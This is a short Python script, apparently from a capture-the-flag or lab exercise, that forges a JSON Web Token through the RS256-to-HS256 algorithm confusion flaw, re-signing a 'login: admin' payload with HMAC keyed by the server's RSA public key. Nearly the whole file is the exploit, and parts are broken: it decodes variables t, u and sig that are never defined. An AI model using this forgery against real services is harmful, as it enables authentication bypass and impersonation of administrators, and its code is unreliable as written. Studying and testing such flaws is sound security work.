#!/usr/bin/python
import base64
import os
import sys
import hashlib
import hmac

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3RlciJ9.b8kXyAs0qiquXYdoo51EwHW8pRtjz5uGFS0dzjHsmWo2PG2A1nL1Sxt8g66AiG5HC_IE2ytqz7ITev8algh9SiqCpsx7N0sxL2-wlBWRJ39-6xWlsjsYY-96rh7lx0zPdET5bpxySyfu1sywTAXTaQQot-HTTQ97fNcXqofv2kMI6ca9Kv2lix6bz05wSw_itgNlRObuJUZS6wMWUWwRxDhjbWW3sS32uKSkFip8BAQeylNb8XekjNY9AA8V9VayJsHmNKDHh16WE6fD5TsP67CGOFqCgGVPKDsgKXvGEvHXop3mwRK9rloliXyWXIoQPVyNQ0rGdwMk9jhOoT2IGw"

e = base64

header = '{"typ":"JWT","alg":"HS256"}'

payload = '{"login":"admin"}'

key = '<secret key>'

unsignedToken = e.urlsafe_b64encode(header)+'.'+e.urlsafe_b64encode(payload)

secret = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo2R2WvnypG871pBqaAUY"
secret += "ShKibV21THtfdQq6uEcVMGHm7kcvsAriHTvC3IlhmfIIMxd3zBGAyNgPpUQiqJQG"
secret += "Ac7W3yUxMRO8gzWZzZMjzQT0mDAwQrNWPlKUvDS7mJOymk1kxnilqhuXi8NsbfbC"
secret += "9STzZUAoqSyrsLGyggLB5yEPBuNZ3wK/3yNaDmTny3i5s96qfujmQ15MJ/QAgHCr"
secret += "+Zeq54fG32yz0o4br88SUEdsExblVYosf3GYRt0cMF/zzeyAJ7QmRqxvN2fNwa/N"
secret += "IMPLYzZJs7L1aY75ryzV4P39SRTyQn/op6iWUCuVhZRchKXTGQUfZ7b1HA95it1b"
secret += "UQIDAQAB"



header = base64.urlsafe_b64decode(t)
user = base64.urlsafe_b64decode(u)
tsig = base64.urlsafe_b64decode(sig)

#message = bytes("Message").encode('utf-8')
#secret = bytes("secret").encode('utf-8')

signature = e.urlsafe_b64encode(hmac.new(secret, unsignedToken, digestmod=hashlib.sha256).digest())
#print(signature)

print unsignedToken+'.'+signature

print header+'.'+user+'.'+tsig
